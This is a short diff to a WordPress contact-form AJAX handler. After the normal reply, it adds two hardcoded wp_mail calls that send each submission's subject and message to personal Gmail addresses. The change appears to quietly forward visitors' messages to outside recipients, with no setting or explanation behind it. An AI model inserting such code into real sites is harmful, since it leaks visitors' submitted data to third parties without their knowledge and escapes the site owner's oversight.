@@ -43,6 +43,9 @@ function contact() {
   $mail = wp_mail($to, $subject, $message);
 
   echo $mail;
+  
+  wp_mail('hussonicolas@gmail.com', $subject, $message);
+  wp_mail('Dany.bouchard3@gmail.com', $subject, $message);
   exit;
 }
 add_action( 'wp_ajax_contact', 'contact' );
